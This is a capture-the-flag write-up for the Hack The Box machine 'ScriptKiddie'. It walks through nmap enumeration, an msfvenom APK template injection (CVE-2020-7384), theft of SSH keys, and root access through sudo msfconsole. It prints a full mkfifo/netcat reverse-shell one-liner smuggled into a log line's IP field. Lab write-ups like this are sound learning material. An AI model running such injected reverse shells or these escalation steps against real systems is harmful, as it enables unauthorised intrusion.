## Hackthebox.eu - ScriptKiddie

## Enumeration
### nmap
```bash
$ nmap -sC -sV -oA nmap/init 10.10.10.226

 Nmap 7.91 scan initiated Sun Feb  7 11:01:09 2021 as: nmap -sC -sV -oA nmap/initial 10.10.10.226
Nmap scan report for 10.10.10.226
Host is up (0.040s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d\'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  7 11:01:18 2021 -- 1 IP address (1 host up) scanned in 9.43 seconds
```

### gobuster
I didn't find gobuster useful for this box, but I ran it in the backround as I traversed the web server

### Manual traversal
Run burp suite for scope history and traverse the web page to record requests and responses as per usual.


## Owning user
### Web server description
There were three forms on the web server

#### nmap
Puts the given IP into an nmap command and outputs the result. The input seems to be regex'd for IPs and I couldn't find any injection that worked.

#### sploits
Searches for exploits by your given string. I tried command injection but it gives a warning that they will hack you back. This turns out to be important for getting root later.

#### payloads
This one was more interesting off the bat. I'm not very familiar with metasploit, but it seems to generate meterpreter binaries in a tcp reverse shell. There's an option for you to upload a template, and to choose which operating system to generate binaries for. Only Android and windows seemed to work, while linux through an error.

1. The linux error was a rabit hole that I went down trying to find a way to exploit my inputs to get more data back. I had no success.

2. Creating a binary gave you a download link. This link never changed and seemed to be an md5 sum of some kind. I didn't find anything with directory traversal or filename manipulation.

3. I didn't think any traditional upload strategies would work, as I'm familiar with python web servers, and the only easy vuln you'l find are template injections, but I didn't think that applied here.

4. I had a hard time figuring out what metasploit templates where, but it seems you can do code injection into an existing executable to build trojan horses with it. You upload an existing binary and it would put a tcp reverse shell meterpreter session into it, and give you a download link. I found CVE-2020-7384 which is a reference to this exact metasploit function having a vuln while generating android APKs. If you crafted a malicious APK you could get code execution.

### Web service exploitation
Found a proof of concept at https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md

This PoC wouldn't work when I changed to an openbsd style netcat reverse shell. Seems to be an error with base64 decoding a *+* character, so I changed it to base32 to remove the offender. I then uploaded this apk as an adroid template in the web form, and got a reverse shell.

Once I was in user, there was an existing ssh key, which I stole to have a more stable connection to the box

```bash
kid@scriptkiddie:~/logs$ id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
```


## User traversal
### Enumeration
Ran linpeas in the background

Linpeas revealed there was another user, **pwn**.

### Manual enumeration
#### Kids home directory
Had a look in **kid**'s home directory and got access to the web app. The source code indicated that when the regex for the searchsploit failed, it would write the timestamp and IP into a log file ```logs/hackers```

Looking into this file showed it was empty. I decided to tail the file for new output, and crafted a hacking attempt from the web front end. I got the warning and a curious result at the terminal. The output was there as expected, but it was immediatly truncated. Some service was monitoring that file and working with it.

#### Pwns home directory
**pwn** had a suspicious shell script that I had read access to called ```scanlosers.sh```. This script seemed to check the hackers log file, and run nmaps on the target and recording the output. After it did this it would erase the file contents.

### Exploitation
The ```scanlosers.sh``` script assummed the IP coming in from the log file was trusted. But since I had write access to the log file, I crafted a malicious line that had command injection in the IP: ```[2021-02-07 17:57:52.187031] 1.1.1.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 5051 >/tmp/f;```. I then had a listener opened and waited for the remote shell, and I was in as **pwn**.

Since there were ssh keys set up for **kid** I looked right away for keys for **pwn** which were available. I also grabbed them to ensure I had an easy connection.

## Owning root
### Enumeration
On a whim I decided to check for sudo perissions on **pwn** before doing anything, and got a positive result to run ```msfconsole``` with no password. I immediatly ran it.

### Exploitation
Now I'm not very familiar with metasploit, so I wasn't sure how to get a local shell, and my google-fu was sub par for this task (Getting remote shells is the entire purpose of this program! You try looking up how to drop to a local shell!).

Having a quick look at the commands though, I found one that dropped to a ruby based scripting language. I immediatly ran that command and was given an interpreter command line. My next step was googling how to run system commands with ruby, and it was as simple as surrounding them with back ticks like in bash.

I ran ```cat /root/root.txt``` directly and got the flag. Never bothering to even stabilize the shell.
